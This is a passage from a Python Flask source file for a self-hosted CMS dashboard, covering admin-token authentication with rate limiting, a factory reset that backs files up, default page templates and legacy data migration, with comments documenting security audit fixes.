# POST /api/factory-reset) was reachable by anything that could reach the
# bound host:port, LAN-adjacent or not. This is a single shared bearer
# token, not a full auth system (multi-user login is out of scope for a
# solo-admin tool), but it closes the worst of H-1/M-7 with one small,
# additive hook. Token is generated once and persisted to
# config/admin_token.txt (gitignored-by-convention, not committed) so it
# survives restarts; set MANAGEMENT_CMS_TOKEN in the environment to pin a
# specific value instead (e.g. shared across a team, or set by a launcher
# script). Set MANAGEMENT_CMS_NO_AUTH=1 to explicitly opt out (e.g. for a
# fully offline/localhost-only dev session) — off by default is not an
# option here, since the whole point is that "internal use" was silently
# doing the job of "no auth needed", which H-1 flagged as false.
_TOKEN_FILE = SCRIPT_PATH / "config" / "admin_token.txt"

def _load_or_create_admin_token() -> str:
    env_token = os.environ.get("MANAGEMENT_CMS_TOKEN")
    if env_token:
        return env_token
    if _TOKEN_FILE.exists():
        existing = _TOKEN_FILE.read_text(encoding="utf-8").strip()
        if existing:
            # AUDIT FIX (SEC-05): also correct perms on a file that
            # already existed before this fix shipped — otherwise a
            # token file created by an older version of this app stays
            # world-readable forever, since the chmod below this branch
            # only ever runs on first creation.
            try:
                os.chmod(_TOKEN_FILE, 0o600)
            except OSError:
                pass
            return existing
    token = secrets.token_urlsafe(32)
    _TOKEN_FILE.parent.mkdir(parents=True, exist_ok=True)
    _TOKEN_FILE.write_text(token, encoding="utf-8")
    # AUDIT FIX (SEC-05): write_text() creates the file at the process's
    # default umask, commonly 0644 — world-readable. On a shared device
    # or multi-user host, any other local account could read the live
    # admin token straight off disk. chmod is a no-op on platforms
    # without POSIX permission bits (wrapped rather than assumed to
    # exist everywhere), but Termux/Android is POSIX, so this is real
    # protection for the actual deployment target.
    try:
        os.chmod(_TOKEN_FILE, 0o600)
    except OSError:
        pass
    return token

ADMIN_TOKEN = _load_or_create_admin_token()
AUTH_DISABLED = os.environ.get("MANAGEMENT_CMS_NO_AUTH") == "1"

# AUDIT FIX (H-1, round 2): the round-1 fix gated every route BUT "/" —
# and then handed the token to anyone hitting "/" by rendering it straight
# into the page (`var ADMIN_TOKEN = {{ admin_token | tojson }}`). Reaching
# "/" requires no token, so that inlining made the entire gate a no-op:
# GET / -> read the token out of the HTML -> use it on everything else.
# Caught in the round-2 audit; this is the real fix.
#
# "/" now serves a shell that DOES NOT know the token. The token still has
# to reach the browser somehow — it's persisted to _TOKEN_FILE, whose path
# (not the token value itself — that's the point) gets printed to the
# console/log at startup, and the person running the app reads the actual
# value from that file (same as any CLI tool's "here's your API key"
# flow) and pastes it into a small login prompt the page shows on first
# load.
# The browser then remembers it for the tab's lifetime via sessionStorage
# — never written back into any HTML response, never logged, and no
# longer accepted from a URL query string (the round-1 `?token=` fallback
# for GET-only navigations leaked into server logs and browser history;
# removed below in favor of a cookie, which the browser attaches
# automatically and which never appears in a URL).
#
# Two channels, by request type:
#  - State-changing requests (POST/PUT/DELETE) MUST send X-Admin-Token as
#    a header. A cross-site page cannot set custom headers on a form
#    submission, so this alone closes CSRF (M-7) regardless of the cookie.
#  - Read-only GET requests may additionally authenticate via the
#    "admin_token" cookie, because the two GET-only call sites that can't
#    attach a header — the live-preview iframe's src, and the ZIP download
#    link — need *some* automatic channel, and a cookie set on the app's
#    own origin is the standard one. This does NOT reopen CSRF: GET
#    requests are non-destructive by contract in this app (every mutating
#    route here is POST/PUT/DELETE), so a forged cross-site GET achieves
#    nothing a public visitor to the built site couldn't already do.
# AUDIT FIX (LOW #1): _TOKEN_FILE was defined a second time here
# (identical line, copy-paste scar) — harmless since it's the same
# constant, but in security-critical code duplicate state is worth
# removing outright rather than leaving as "harmless." Removed; the
# definition above (right before _load_or_create_admin_token()) is the
# only one now.
_AUTH_EXEMPT_PREFIXES = ("/static/", "/media-files/")
_AUTH_EXEMPT_PATHS = ("/", "/api/auth/check")

# AUDIT FIX (SEC-04): no failed-auth-attempt logging and no rate limit
# anywhere — a script could try tokens indefinitely with zero record and
# zero slowdown, and the operator would have no way to know it was
# happening. In-memory, per-process, single-dict tracking is sufficient
# here (this is a single-process Flask dev server for a solo-admin tool,
# not a multi-worker deployment where per-process state would under-count
# — if that ever changes, this needs a shared store instead). Threshold
# and window are deliberately generous (an operator fat-fingering their
# own token a few times must never get locked out of their own app) while
# still meaningfully slowing down automated guessing.
_AUTH_FAILURE_WINDOW_SECONDS = 300
_AUTH_FAILURE_THRESHOLD = 10
_auth_failures: Dict[str, list] = {}

def _record_auth_failure(ip: str) -> None:
    now = _time.time()
    attempts = [t for t in _auth_failures.get(ip, []) if now - t < _AUTH_FAILURE_WINDOW_SECONDS]
    attempts.append(now)
    _auth_failures[ip] = attempts
    log.warning("Failed admin-token attempt from %s (%d in the last %ds)",
                ip, len(attempts), _AUTH_FAILURE_WINDOW_SECONDS)

def _is_auth_rate_limited(ip: str) -> bool:
    now = _time.time()
    attempts = [t for t in _auth_failures.get(ip, []) if now - t < _AUTH_FAILURE_WINDOW_SECONDS]
    _auth_failures[ip] = attempts
    return len(attempts) >= _AUTH_FAILURE_THRESHOLD

@app.before_request
def _require_admin_token():
    if AUTH_DISABLED:
        return None
    if request.path in _AUTH_EXEMPT_PATHS or request.path.startswith(_AUTH_EXEMPT_PREFIXES):
        return None
    if _is_auth_rate_limited(request.remote_addr or "unknown"):
        return jsonify({"error": "Too many failed attempts — try again later"}), 429
    header_token = request.headers.get("X-Admin-Token")
    if header_token and hmac.compare_digest(header_token, ADMIN_TOKEN):
        return None
    if request.method == "GET":
        cookie_token = request.cookies.get("admin_token")
        if cookie_token and hmac.compare_digest(cookie_token, ADMIN_TOKEN):
            return None
    _record_auth_failure(request.remote_addr or "unknown")
    return jsonify({"error": "Unauthorized — missing or invalid admin token"}), 401

@app.route("/api/auth/check", methods=["GET"])
def auth_check():
    # AUDIT FIX (H-1, round 2): dedicated endpoint the login prompt calls
    # to verify a pasted token before storing it — also sets the
    # "admin_token" cookie (GET-only-nav auth channel, see block above) on
    # success, scoped Strict/Lax same-site so it's never sent cross-site.
    if _is_auth_rate_limited(request.remote_addr or "unknown"):
        return jsonify({"ok": False, "error": "Too many failed attempts — try again later"}), 429
    supplied = request.headers.get("X-Admin-Token", "")
    if not supplied or not hmac.compare_digest(supplied, ADMIN_TOKEN):
        _record_auth_failure(request.remote_addr or "unknown")
        return jsonify({"ok": False}), 401
    resp = jsonify({"ok": True})
    # AUDIT FIX (M-4): httponly was False with no JS anywhere reading
    # document.cookie for this — confirmed, not assumed — so there was no
    # reason to leave it readable to a future XSS. True now, denying any
    # injected script read access. Secure is conditional rather than
    # hardcoded True: this app's default bind is 127.0.0.1 over plain
    # HTTP (that's the point of the H-1 round-2 fix), and a hardcoded
    # Secure flag would make the cookie silently never get set on that
    # default path, since browsers drop Secure cookies on non-HTTPS
    # requests. request.is_secure reflects the actual connection the
    # login request arrived on.
    resp.set_cookie("admin_token", supplied, samesite="Strict", httponly=True,
                     secure=request.is_secure, path="/")
    return resp

# ── MFDB layout (per Management bootstrap deploy) — consistent "MFDB"
# subfolder for all three taxonomies ─────────────────────────────
CONTENT_ROOT    = SCRIPT_PATH / "Content"
ROOT_MANIFEST   = SCRIPT_PATH / "104a.mfdb.bejson"
NOTES_MANIFEST  = CONTENT_ROOT / "Notes" / "MFDB" / "104a.mfdb.bejson"
TASKS_MANIFEST  = CONTENT_ROOT / "Tasks" / "MFDB" / "104a.mfdb.bejson"
LINKS_MANIFEST  = CONTENT_ROOT / "Links" / "MFDB" / "104a.mfdb.bejson"
# PAGES_MANIFEST: the OLD admin Pages MFDB Bootstrap already deploys (flat
# category, no page_type/hierarchy). NavLink and (admin) Media are secondary
# entities living IN THIS manifest, per management_bootstrap_deploy() — this
# is where /api/nav/tree and the admin media-upload handler point, NOT the
# new management_cms Content/Page manifest below, which is a separate,
# public-hosting-layer Page entity with its own folder ("Content/Page",
# singular — Bootstrap's is "Content/Pages", plural — no path collision).
PAGES_MANIFEST  = CONTENT_ROOT / "Pages" / "MFDB" / "104a.mfdb.bejson"

# CMS_MANIFESTS: populated by ensure_scaffold_deployed() via management_cms_init().
# Keys: "cms_category", "cms_page", "cms_post", "cms_media" — the
# "cms_" prefix avoids colliding with Bootstrap's existing bare "page"/"nav"/
# "media"-shaped registrations for the admin Pages MFDB above.
CMS_MANIFESTS: dict = {}

def ensure_scaffold_deployed():
    """Deploys the Web_Framework scaffold + Management sections on first run. Idempotent."""
    if not (ROOT_MANIFEST.exists() and NOTES_MANIFEST.exists() and TASKS_MANIFEST.exists() and LINKS_MANIFEST.exists()):
        Bootstrap.management_bootstrap_deploy(str(SCRIPT_PATH), "Management_CMS")
        _migrate_legacy_data()
        _migrate_legacy_config()

    # management_cms_init() is safe to call on every startup regardless of the
    # guard above — it no-ops on manifests that already exist and no longer
    # re-registers an already-registered taxonomy (fixed; see that file's
    # docstring for why the old unconditional-register behavior was a bug).
    global CMS_MANIFESTS
    CMS_MANIFESTS = CmsInit.management_cms_init(str(SCRIPT_PATH), str(ROOT_MANIFEST), taxonomy_prefix="cms_")
    _ensure_cms_components_registered()
    # Pushes the canonical component/skeleton content (including the 5 CMS
    # defaults _ensure_cms_components_registered() just seeded) into THIS
    # app's own root manifest's ComponentMap/SkeletonStore, so
    # management_cms_render_layout()'s per-app-first lookup actually finds
    # local copies to edit, instead of falling straight through to the
    # canonical library store every time. This is what makes "customize the
    # public site's skeletons from inside the dashboard, no library edits"
    # actually true — without this call, root_manifest_path's own store
    # stayed empty for these 5 components and every render fell back to
    # canonical regardless.
    WebFrameworkScaffold.webframework_scaffold_resync_components(str(SCRIPT_PATH))

def _factory_reset() -> dict:
    """
    Wipes the app back to a clean, freshly-scaffolded state and immediately
    re-bootstraps in-process (no restart required).

    Backs up rather than permanently destroys: everything live gets moved
    (not deleted) into Persist/factory_reset_backups/<UTC timestamp>/,
    preserving the same relative layout, before re-running the full
    bootstrap sequence.

    IMPORTANT: the two legacy Persist/*.bejson files (homepage_data.bejson,
    config.bejson) are backed up and moved away too, not just left in
    place. Leaving them would cause _migrate_legacy_data()/
    _migrate_legacy_config() to silently re-import the old data the moment
    ensure_scaffold_deployed() runs again immediately after this function —
    which would defeat the entire point of a "clean default state" reset.
    Nothing is unrecoverably destroyed; the backup folder holds everything
    that was live before the reset.

    Wipes: the root manifest, Content/ (Notes/Tasks/Links/Pages/Category/
    Nav/Page/Post/media — including uploaded files, since UPLOADS_DIR lives
    under Content/media/), config/ (resets all Settings to factory
    defaults), Export/ (any previously built static site), and the two
    legacy Persist files.

    Does NOT touch: lib/ (application code), lib/Web_Framework/
    ComponentsMFDB (the canonical HTML skeleton library used as the Static
    Builder's fallback — these are factory-shipped templates, not user
    data, and wiping them would just require immediately re-seeding them
    via _ensure_cms_components_registered() anyway).
    """
    import datetime
    timestamp = datetime.datetime.now(datetime.timezone.utc).strftime("%Y-%m-%dT%H-%M-%SZ")
    backup_dir = SCRIPT_PATH / "Persist" / "factory_reset_backups" / timestamp
    backup_dir.mkdir(parents=True, exist_ok=True)

    targets = {
        "root_manifest": ROOT_MANIFEST,
        "content": CONTENT_ROOT,
        "config": SCRIPT_PATH / "config",
        "export": SCRIPT_PATH / "Export",
        "legacy_data": LEGACY_DATA_FILE,
        "legacy_config": LEGACY_CONFIG_FILE,
    }
    moved = {}
    for name, src in targets.items():
        if src.exists():
            dest = backup_dir / src.name
            shutil.move(str(src), str(dest))
            moved[name] = str(dest)

    global CMS_MANIFESTS
    CMS_MANIFESTS = {}

    # Re-bootstrap immediately, in-process — the reset is usable right away,
    # no restart needed. This unconditionally re-deploys (not guarded by the
    # existence check in ensure_scaffold_deployed(), since we just moved
    # everything that check looks for).
    Bootstrap.management_bootstrap_deploy(str(SCRIPT_PATH), "Management_CMS")
    CMS_MANIFESTS = CmsInit.management_cms_init(str(SCRIPT_PATH), str(ROOT_MANIFEST), taxonomy_prefix="cms_")
    _ensure_cms_components_registered()
    WebFrameworkScaffold.webframework_scaffold_resync_components(str(SCRIPT_PATH))

    return {"backed_up_to": str(backup_dir), "moved": moved}

def _ensure_cms_components_registered():
    """
    One-time seed: registers factory-default HTML skeletons for the five
    component IDs lib_bejson_Management_static_builder.py expects
    (management_cms_home/page/post/category_archive/tag_archive), matching
    this app's BECSS design tokens (true black background, #DE2626 accent,
    white text). Without this, /api/build fails immediately on a fresh
    install — management_cms_render_layout() fails loudly by design rather
    than silently falling back to placeholder markup, so *something* has to
    register these once. Registered canonically (not per-app) since these
    are meant as the shared factory defaults every app falls back to; an
    app can still override any one of them locally later (see
    management_cms_render_layout()'s per-app-first lookup).

    BUG FIX (significant): every template now includes a real <header>
    (site title, linking home) + <nav>{{nav_html}}</nav> + <footer>,
    instead of a bare <h1>+content with no site chrome at all. Previously
    the nav_html token wasn't even threaded into these templates because
    nothing upstream was passing real nav data (see the fix in
    lib_bejson_Management_static_builder.py's _management_cms_get_nav_html())
    — a built site looked like disconnected page fragments with no shared
    navigation, which is very likely what "no website template, just
    nothing" was describing. Basic layout CSS (max-width container,
    reasonable type scale) is inlined directly in each template rather than
    a separate stylesheet, since these skeletons need to be fully
    self-contained (no guaranteed external asset pipeline at this stage).
    """
    import lib_bejson_Management_components as WebFrameworkComponents

    shared_style = (
        '<style>'
        'body{background:#000;color:#fff;font-family:Inter,sans-serif;margin:0;}'
        '.becss-c-site-header{display:flex;align-items:center;justify-content:space-between;'
        'padding:1rem 1.5rem;border-bottom:1px solid #2a2a2a;}'
        '.becss-c-site-header__title{color:#fff;text-decoration:none;font-size:1.1rem;font-weight:700;}'
        '.becss-c-site-header__title:hover{color:#DE2626;}'
        '.becss-c-nav{list-style:none;display:flex;gap:.4rem;margin:0;padding:0;flex-wrap:wrap;}'
        # SIDEBAR-STYLE FIX (2026-07-25, requested directly — "sidebar
        # looks kind of goofy, use the sidebar design from the two
        # templates"): previously nav links were plain inline text with
        # no padding or row treatment, and a group label sat crammed
        # inline next to its (horizontally wrapping) link list — looked
        # cramped and disorganized, especially in the narrow mobile
        # flyout. Reworked into proper tree-style rows: each link is now
        # a full padded row with a hover background + red left-accent
        # border on hover, matching the reference docs' .becss-tree__row
        # treatment, and each group is a labeled vertical stack instead
        # of an inline label-plus-wrapped-links strip. Not copying the
        # reference docs' JS expand/collapse behavior or admin-style
        # icons — just the row/hover visual language, applied to the
        # existing nav structure.
        '.becss-c-nav__link{display:inline-flex;align-items:center;color:#ccc;text-decoration:none;'
        'font-size:.9rem;padding:.45rem .7rem;border-radius:4px;'
        'transition:background-color .15s ease,color .15s ease;}'
        '.becss-c-nav__link:hover{background-color:#1a1a1a;color:#fff;}'
        '.becss-c-nav__submenu{list-style:none;margin:.2rem 0 .2rem 1rem;padding:0;'
        'display:flex;flex-direction:column;gap:.15rem;}'
        '.becss-c-nav-group{display:flex;flex-direction:column;gap:.15rem;}'
        '.becss-c-nav-group__label{font-size:.68rem;text-transform:uppercase;letter-spacing:.08em;'
        'color:#777;padding:.3rem .7rem 0;}'
        '.becss-c-main{max-width:720px;margin:0 auto;padding:2rem 1.5rem;line-height:1.6;}'
        '.becss-c-main h1{color:#DE2626;margin-top:0;}'
        '.becss-c-main a{color:#DE2626;}'
        '.becss-c-site-footer{text-align:center;padding:1.5rem;border-top:1px solid #2a2a2a;'
        'color:#777;font-size:.78rem;margin-top:2rem;}'
        '.becss-c-hamburger{display:none;background:none;border:0;color:#fff;font-size:1.4rem;'
        'line-height:1;cursor:pointer;padding:.25rem .5rem;}'
        '#becssNavOv{display:none;position:fixed;inset:0;background:rgba(0,0,0,.6);z-index:998;}'
        '@media(max-width:640px){'
        '.becss-c-hamburger{display:block;}'
        '#becssNav{position:fixed;top:0;right:0;bottom:0;width:78vw;max-width:300px;'
        'background:#0a0a0a;border-left:1px solid #2a2a2a;padding:3.5rem 1.25rem 1.5rem;'
        'transform:translateX(100%);transition:transform .2s ease;z-index:999;overflow-y:auto;}'
        '#becssNav.becss-is-open{transform:translateX(0);}'
        '#becssNav.becss-is-open ~ #becssNavOv{display:block;}'
        '#becssNav .becss-c-nav{flex-direction:column;gap:.1rem;align-items:stretch;}'
        '#becssNav .becss-c-nav__link{padding:.7rem .9rem;border-radius:6px;}'
        '#becssNav .becss-c-nav__link:hover{background-color:#1a1a1a;color:#fff;'
        'border-left:3px solid #DE2626;padding-left:calc(.9rem - 3px);}'
        '#becssNav .becss-c-nav-group__label{padding:.9rem .3rem .2rem;}'
        '}'
        # SHARED-FEED-COMPONENT FIX (2026-07-22, requested directly): CSS
        # for management_cms_shared_render_feed()'s cards — one surface
        # shared by category archives, tag archives, and the homepage
        # recent-posts widget instead of three separately-styled lists.
        '.becss-c-feed{display:flex;flex-direction:column;gap:1.25rem;}'
        '.becss-c-feed__card{border:1px solid #2a2a2a;border-radius:6px;padding:1.1rem 1.25rem;'
        'transition:border-color .15s ease;}'
        '.becss-c-feed__card:hover{border-color:#DE2626;}'
        '.becss-c-feed__title{margin:0 0 .35rem;font-size:1.15rem;}'
        '.becss-c-feed__title a{color:#fff;}'
        '.becss-c-feed__title a:hover{color:#DE2626;}'
        '.becss-c-feed__meta{font-size:.8rem;color:#888;margin-bottom:.5rem;}'
        '.becss-c-feed__excerpt{margin:0;color:#ccc;font-size:.92rem;line-height:1.5;}'
        '.becss-c-feed__empty{color:#888;font-style:italic;}'
        '.becss-c-widget .becss-c-feed{margin-top:.75rem;}'
        '.becss-c-widget .becss-c-feed__card{padding:.75rem .9rem;}'
        # HOMEPAGE HERO FIX (2026-07-28): CSS for the new hero block on
        # the auto-generated homepage (site title + tagline, styled
        # distinctly from a regular <h1>/<p> so the front page reads as
        # a front page instead of just the top of a feed list).
        '.becss-c-hero{padding:2.5rem 0 2rem;margin-bottom:1.5rem;border-bottom:1px solid #2a2a2a;'
        'text-align:center;}'
        '.becss-c-hero__title{font-size:2.1rem;margin:0 0 .5rem;color:#fff;}'
        '.becss-c-hero__tagline{font-size:1.05rem;color:#999;margin:0;}'
        # FEED PAGINATION FIX (2026-07-28): CSS for
        # management_cms_shared_render_pagination_nav()'s output — used on
        # the homepage feed, category archives, and tag archives once any
        # of them has more than one page of posts.
        '.becss-c-pagination{display:flex;gap:.4rem;flex-wrap:wrap;margin-top:1.5rem;'
        'padding-top:1.25rem;border-top:1px solid #2a2a2a;}'
        '.becss-c-pagination__link{padding:.4rem .75rem;border:1px solid #2a2a2a;border-radius:4px;'
        'color:#ccc;text-decoration:none;font-size:.85rem;}'
        '.becss-c-pagination__link:hover{border-color:#DE2626;color:#fff;}'
        '.becss-c-pagination__link--active{background-color:#DE2626;border-color:#DE2626;color:#fff;}'
        '</style>'
    )

    def page_shell(title_tag_content, body_html, meta_description="", og_type="website"):
        # PROFESSIONAL-POLISH FIX (2026-07-22, requested after live-site
        # review): added lang="en" (was missing on every exported page —
        # a real accessibility/SEO gap) and a viewport meta tag (was
        # missing entirely, so the mobile-responsive CSS below had nothing
        # to actually engage on a phone — the hamburger nav existed in
        # CSS with no way to trigger mobile layout at all). Nav is now a
        # real collapsible hamburger menu on narrow screens instead of a
        # plain inline list that would have just wrapped/overflowed.
        meta = f'<meta name="description" content="{meta_description}">' if meta_description else ""
        # SEO/SOCIAL-SHARING FIX (2026-07-27, requested directly — "get to
        # work on whatever is not done"): previously no favicon and no
        # Open Graph tags at all, so shared links had no preview and
        # browser tabs had no icon. Favicon is a self-contained inline SVG
        # data URI (a red circle on black, matching the site's own
        # #DE2626/black palette) — no image asset to generate or ship.
        # OG tags use {{og_title}}/{{og_description}}/{{canonical_url}}
        # tokens populated per-page by each builder function in
        # lib_bejson_Management_static_builder.py; og:description
        # falls back to an empty string cleanly (no dangling content="").
        favicon = (
            "<link rel=\"icon\" href=\"data:image/svg+xml,"
            "%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E"
            "%3Crect width='100' height='100' fill='%23000'/%3E"
            "%3Ccircle cx='50' cy='50' r='32' fill='%23DE2626'/%3E%3C/svg%3E\">"
        )
        og_tags = (
            f'<meta property="og:type" content="{og_type}">'
            f'<meta property="og:site_name" content="{{{{site_title}}}}">'
            f'<meta property="og:title" content="{{{{og_title}}}}">'
            f'<meta property="og:description" content="{{{{og_description}}}}">'
            f'<meta property="og:url" content="{{{{canonical_url}}}}">'
            f'<link rel="canonical" href="{{{{canonical_url}}}}">'
            f'<meta name="twitter:card" content="summary">'
        )
        return (
            f'<!doctype html><html lang="en"><head><meta charset="utf-8">'
            f'<meta name="viewport" content="width=device-width,initial-scale=1">'
            f'<title>{title_tag_content}</title>{meta}{favicon}{og_tags}'
            f'{shared_style}</head><body>'
            f'<header class="becss-c-site-header">'
            f'<a class="becss-c-site-header__title" href="/index.html">{{{{site_title}}}}</a>'
            f'<button class="becss-c-hamburger" aria-label="Menu" '
            f'onclick="document.getElementById(\'becssNav\').classList.toggle(\'becss-is-open\')">&#9776;</button>'
            f'<nav id="becssNav">{{{{nav_html}}}}</nav>'
            f'<div id="becssNavOv" '
            f'onclick="document.getElementById(\'becssNav\').classList.remove(\'becss-is-open\')"></div>'
            f'</header>'
            f'<main class="becss-c-main">{body_html}</main>'
            f'<footer class="becss-c-site-footer">{{{{site_title}}}}</footer>'
            f'</body></html>'
        )

    defaults = {
        "management_cms_home": (
            "Home Page",
            page_shell("{{site_title}}", "{{content_html}}"),
        ),
        "management_cms_page": (
            "Page",
            page_shell("{{title}} — {{site_title}}", "<h1>{{title}}</h1>{{content_html}}", "{{meta_description}}"),
        ),
        "management_cms_post": (
            "Post",
            page_shell(
                "{{title}} — {{site_title}}",
                # PROFESSIONAL-POLISH FIX (2026-07-22): previously
                # hardcoded "By {{author}} · {{published_at}} ·
                # {{category_title}}" and "Tags: {{tags}}" unconditionally
                # — left a dangling "· " when category (or author) was
                # empty, an orphaned "Tags:" label with nothing after it,
                # and printed published_at as a raw ISO timestamp. Both
                # are now pre-built conditionally server-side (see
                # _management_cms_build_post() in
                # lib_bejson_Management_static_builder.py) into
                # {{post_meta_html}}/{{tags_html}} tokens that are already
                # empty strings when there's nothing to show.
                '<h1>{{title}}</h1>{{post_meta_html}}{{content_html}}{{tags_html}}',
                og_type="article",
            ),
        ),
        "management_cms_category_archive": (
            "Category Archive",
            # SHARED-FEED-COMPONENT FIX (2026-07-22): post_list_html is now
            # a self-contained management_cms_shared_render_feed() output
            # (a <div class="becss-c-feed"> of cards), not a bare list of
            # <li> — the old "<ul>{{post_list_html}}</ul>" wrapper would
            # have put a <div> directly inside a <ul>, which is invalid
            # HTML. Removed.
            page_shell("{{category_title}} — {{site_title}}", "<h1>{{category_title}}</h1><p>{{category_description}}</p>{{post_list_html}}"),
        ),
        "management_cms_tag_archive": (
            "Tag Archive",
            page_shell("#{{tag_name}} — {{site_title}}", "<h1>#{{tag_name}}</h1>{{post_list_html}}"),
        ),
    }
    for component_id, (label, html) in defaults.items():
        # BUG FIX (root cause of a repeatedly-recurring problem this
        # session): this loop used to call webframework_components_register()
        # unconditionally, every single time this function ran — which is
        # every app startup, per ensure_scaffold_deployed() above having no
        # guard around calling it. webframework_components_register()
        # itself unconditionally overwrites an existing skeleton's content
        # (see _upsert_skeleton() in lib_bejson_Management_components.py),
        # so despite this function's own docstring calling it a "one-time
        # seed," it actually clobbered the canonical SkeletonStore back to
        # these hardcoded factory defaults on every restart — silently
        # destroying any customization (like the exported-site redesign
        # built earlier this session) that only lived in the canonical
        # copy and wasn't also protected by a user_customized flag on some
        # app's own root manifest. Root-caused via direct code reading
        # after this exact symptom recurred three times; now actually
        # checks for an existing registration first, matching what the
        # docstring already claimed this did.
        if WebFrameworkComponents.webframework_components_get_record(component_id) is not None:
            continue
        WebFrameworkComponents.webframework_components_register(component_id, label, html_content=html)


def _archive_legacy_file(path: Path) -> None:
    """
    Moves (never deletes) a consumed legacy Persist/*.bejson file into
    Persist/_migrated_archive/<UTC timestamp>/, so it stops cluttering the
    project root once its one-time migration has actually run — audit item
    4c ("obsolete migration artifacts... should be purged"). Safe by
    construction: this is only ever called from the tail of
    _migrate_legacy_config()/_migrate_legacy_data(), which themselves only
    run inside ensure_scaffold_deployed()'s manifests-don't-exist-yet guard
    — i.e. exactly once, immediately after that migration has just
    succeeded in-process. Nothing is destroyed; the file is still on disk,
    just relocated out of the way, same as _factory_reset()'s existing
    backup-not-delete pattern.
    """
    import datetime
    if not path.exists():
        return
    timestamp = datetime.datetime.now(datetime.timezone.utc).strftime("%Y-%m-%dT%H-%M-%SZ")
    archive_dir = SCRIPT_PATH / "Persist" / "_migrated_archive" / timestamp
    archive_dir.mkdir(parents=True, exist_ok=True)
    shutil.move(str(path), str(archive_dir / path.name))

def _migrate_legacy_config():
    """
    One-time: copies the old flat Persist/config.bejson into the location
    lib_bejson_Management_config.py expects (<root>/config/config.bejson).
    Same format (104a ScriptConfig), just a different path — a straight
    copy preserves real, already-customized settings (site_title, colors,
    etc.) instead of silently starting over with defaults. Once copied,
    the old file is archived (moved, not deleted) via _archive_legacy_file()
    — see that function's docstring for why this is safe.
    """
    new_config_path = SCRIPT_PATH / "config" / "config.bejson"
    if new_config_path.exists() or not LEGACY_CONFIG_FILE.exists():
        return
    new_config_path.parent.mkdir(parents=True, exist_ok=True)
    shutil.copyfile(LEGACY_CONFIG_FILE, new_config_path)
    _archive_legacy_file(LEGACY_CONFIG_FILE)

def _migrate_legacy_data():
    """
    One-time: copies rows out of the old Persist/homepage_data.bejson (104db)
    into the new per-section MFDBs, preserving original ids/timestamps.
    Only runs once, right after a fresh scaffold deploy. Once the migration
    loop below completes, the legacy file is archived (moved, not deleted)
    via _archive_legacy_file() — audit item 4c; see that function's
    docstring for why this is safe here specifically.

    IMPORTANT: the old app.py never re-derived field positions from the
    on-disk "Fields" array it loaded — it always used the hardcoded
    SCHEMA_FIELDS order baked into its own source at the time a row was
    written. Migrations over time appended new field *declarations* to the
    on-disk "Fields" metadata without reordering it to match, so the file's
    own "Fields" list is stale/decorative and does NOT reflect actual value
    positions. This hardcoded order is copied verbatim from the old
    app.py's SCHEMA_FIELDS constant and is the only correct key.
    """
    if not LEGACY_DATA_FILE.exists():
        return
    with open(LEGACY_DATA_FILE, "r", encoding="utf-8") as f:
        old = json.load(f)

    LEGACY_RUNTIME_FIELD_ORDER = [
        "Record_Type_Parent",
        "link_id", "link_title", "link_url", "link_category", "link_icon", "link_description", "link_created_at",
        "note_id", "note_title", "note_content", "note_color", "note_category", "note_created_at",
        "cat_id", "cat_name", "cat_created_at",
        "todo_id", "todo_text", "todo_done", "todo_priority", "todo_detail", "todo_created_at",
    ]
    old_idx = {n: i for i, n in enumerate(LEGACY_RUNTIME_FIELD_ORDER)}

    def val(row, name, default=None):
        i = old_idx.get(name)
        return row[i] if i is not None and i < len(row) else default

    def _looks_like_iso_timestamp(v):
        return isinstance(v, str) and len(v) >= 19 and v[4:5] == "-" and "T" in v

    # Legacy links stored category as a plain free-text string (e.g. "PERSONAL"),
    # from before LinkCategory existed as a proper lookup table. Promote each
    # distinct legacy string into a real LinkCategory so it doesn't silently
    # become "Uncategorized" once the UI switches to cat_id-based categories.
    _legacy_link_cat_ids = {}

    def _promote_link_category(name):
        if not name:
            return None
        if name not in _legacy_link_cat_ids:
            _legacy_link_cat_ids[name] = LinksLib.management_links_category_add(str(LINKS_MANIFEST), name)
        return _legacy_link_cat_ids[name]

    for row in old.get("Values", []):
        rtp = val(row, "Record_Type_Parent")
        if rtp == "Link":
            link_category_id = _promote_link_category(val(row, "link_category"))
            MFDBCore.mfdb_core_add_entity_record(str(LINKS_MANIFEST), "Link", [
                "link", None, link_category_id, val(row, "link_id"), val(row, "link_title"),
                0, "default", True, False, val(row, "link_created_at"),
                val(row, "link_url"), val(row, "link_icon"), val(row, "link_description"),
            ])
        elif rtp == "Note":
            # Older notes (pre note_category field) have their created_at sitting where
            # the current metadata says "note_category" — no category was ever recorded
            # for them. Newer notes have the current, correct layout. Detected per-row by
            # checking whether the value at the "note_category" slot is timestamp-shaped.
            raw_cat_slot = val(row, "note_category")
            if _looks_like_iso_timestamp(raw_cat_slot):
                note_category, note_created_at = None, raw_cat_slot
            else:
                note_category, note_created_at = raw_cat_slot, val(row, "note_created_at")
            MFDBCore.mfdb_core_add_entity_record(str(NOTES_MANIFEST), "Note", [
                "note", None, note_category, val(row, "note_id"), val(row, "note_title"),
                0, "default", True, False, note_created_at,
                val(row, "note_content"), val(row, "note_color"),
            ])
        elif rtp == "NoteCategory":
            MFDBCore.mfdb_core_add_entity_record(str(NOTES_MANIFEST), "NoteCategory", [
                val(row, "cat_id"), val(row, "cat_name"), val(row, "cat_created_at"),
            ])
        elif rtp == "TodoItem":
            MFDBCore.mfdb_core_add_entity_record(str(TASKS_MANIFEST), "TodoItem", [
                "task", None, None, val(row, "todo_id"), val(row, "todo_text"),
                0, "default", True, False, val(row, "todo_created_at"),
                val(row, "todo_done"), val(row, "todo_priority"), val(row, "todo_detail"),
            ])

    _archive_legacy_file(LEGACY_DATA_FILE)

ensure_scaffold_deployed()

# ── Row → response-dict (preserves the original API's JSON shape) ──────────

def link_to_dict(r):
    return {
        "link_id":     r["id"],
        "title":       r["label"],
        "url":         r["url"],
        "category":    r["category"],
        "icon":        r["icon"],
        "description": r["description"],
    }

def note_to_dict(r):
    return {
        "note_id":       r["id"],
        "note_title":    r["label"],
        "note_content":  r["content"],
        "note_color":    r["color"],
        "note_category": r["category"],
    }

def cat_to_dict(r):
    return {
        "cat_id":   r["cat_id"],
        "cat_name": r["cat_name"],
    }

def todo_to_dict(r):
    return {
        "todo_id":     r["id"],
        "todo_text":   r["label"],
        "done":        bool(r["done"]) if r["done"] is not None else False,
        "priority":    r["priority"] or "medium",
        "todo_detail": r["detail"] or "",
        "todo_category": r["category"],
    }

def page_to_dict(r):
    return {
        "id": r["id"], "category_id": r.get("category_id_fk"), "slug": r["slug"],
